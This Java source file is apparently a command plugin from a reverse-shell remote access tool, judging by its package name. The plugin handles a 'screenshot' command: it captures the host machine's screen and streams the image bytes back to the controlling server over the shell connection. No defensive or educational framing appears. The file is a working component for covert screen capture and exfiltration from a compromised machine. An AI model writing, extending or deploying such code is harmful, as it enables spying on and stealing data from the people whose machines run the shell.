package obs1d1anc1ph3r.reverseshell.plugins;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.utils.ScreenShot;

public class ScreenshotCommand implements CommandPlugin {
    
    private final ScreenShot screenShot = new ScreenShot();
    private ServerConnection serverConnection;
    private static final Logger logger = Logger.getLogger(ScreenshotCommand.class.getName());
    
    @Override
    public String getCommandName() {
        return "screenshot";
    }
    
    @Override
    public String execute(String[] args) {
        if (serverConnection == null) {
            logger.severe("ServerConnection is not initialized.");
            return "Error: Server connection not set.";
        }
        
        byte[] imageBytes = screenShot.imageBytes();
        if (imageBytes != null && imageBytes.length > 0) {
            sendScreenShot(imageBytes);
            return "Screenshot captured and sent.";
        } else {
            serverConnection.sendResponse("Error: Failed to capture screenshot.");
            return "Error: Failed to capture screenshot.";
        }
    }
    
    private void sendScreenShot(byte[] imageBytes) {
        try {
            if (imageBytes.length > 0) {
                serverConnection.sendResponse("screenshot");
                serverConnection.getDataOut().writeInt(imageBytes.length);
                serverConnection.getDataOut().write(imageBytes);
                serverConnection.getDataOut().flush();
            } else {
                logger.warning("Empty screenshot data, nothing sent.");
                serverConnection.sendResponse("Error: Failed to capture screenshot.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send screenshot", ex);
        }
    }
    
    public void setServerConnection(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
    }
}
